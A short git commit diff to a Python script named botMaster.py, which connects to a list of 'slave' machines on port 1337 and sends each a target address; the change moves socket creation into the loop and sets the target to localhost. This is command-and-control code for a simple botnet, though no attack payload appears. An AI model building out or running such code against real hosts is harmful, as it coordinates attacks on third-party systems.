98051f3f463a2f61d173d607005dfc7d23c848e8
Mike Romano <romano.michaelj@gmail.com>
2011-03-14 14:48:10 -0400

    botMaster.py

--- botMaster.py
+++ botMaster.py
@@ -2,9 +2,10 @@ import socket
 #Put Slave Addresses in addresses array
 addresses=['127.0.0.1','127.0.0.1',]
 #Set target to url or IP - ie 127.0.0.1 or www.mysite.org
-target = ''
+target = '127.0.0.1'
 port = 1337
-master = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 for host in addresses:
+	master = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	master.connect((host,port))
 	master.send(target)
+	master.close()
